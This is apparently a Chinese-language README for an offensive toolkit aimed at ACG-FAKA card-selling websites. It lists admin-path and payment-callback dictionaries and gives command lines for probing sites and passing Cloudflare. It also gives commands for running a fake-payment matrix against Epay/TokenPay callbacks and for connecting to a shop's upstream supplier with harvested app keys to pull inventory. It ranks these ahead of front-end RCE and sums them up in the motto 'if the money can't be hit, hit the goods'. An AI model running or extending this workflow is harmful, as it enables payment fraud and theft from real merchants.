# ACG-FAKA / 异次元 专项包

比通用 nuclei 更贴发卡站存量。

| 路径 | 用途 |
|------|------|
| `dicts/admin_paths.txt` | 随机/常见后台路径 |
| `dicts/callback_handles.txt` | `callback.{Handle}` 枚举 |
| `dicts/shared_merchants.example.json` | Shared 商户字典样例（可复制为 `shared_merchants.json`） |
| `USER_SESSION.md` | 会员 JWT 结构与作业注意 |
| `bin/acg_probe.py` | 指纹 + 后台 + 回调存活 |
| `bin/acg_shared_upstream.py` | **共享货上游**：discover / connect / match / inventory |

Playbook（gmail168 真经）：`传承/货仓·上游.md`  
Skill：`杀招/秦百胜·货仓/SKILL.md`  

默认优先级：橱窗严签 / 见 `shared_id` → **先打上游库存**，再假支付/前台 RCE。  
口诀：资源宿主 + 共享码 + 历史凭据 = 上游候选；钱打不通就打货。

```bash
# 建议先有头过 CF
python3 炼蛊房/cf_session.py capture --url https://站/ --case <案卷>

python3 tools/acg-faka/bin/acg_probe.py \
  --base https://站 --case <案卷> \
  --storage 案卷/<案卷>/接管/session/storage_state.json

# 假支付矩阵
python3 炼蛊房/pay_matrix.py --base https://站 --handles Epay,TokenPay \
  --trade-no <oid> --money 10 --case <案卷> --pay-url '<跳转>'

# 严签 + shared_id → 共享货上游（gmail168 范式）
python3 tools/acg-faka/bin/acg_shared_upstream.py discover \
  --base https://橱窗 --case <案卷> --expand

python3 tools/acg-faka/bin/acg_shared_upstream.py connect \
  --upstream https://上游 --app-id <id> --app-key <key> \
  --base https://橱窗 --case <案卷> --items

python3 tools/acg-faka/bin/acg_shared_upstream.py match \
  --base https://橱窗 --upstream https://上游 \
  --app-id <id> --app-key <key> --case <案卷>
```

产物：

- 探针：`案卷/<案卷>/测绘/acg/`
- 共享货：`案卷/<案卷>/测绘/acg_shared/`
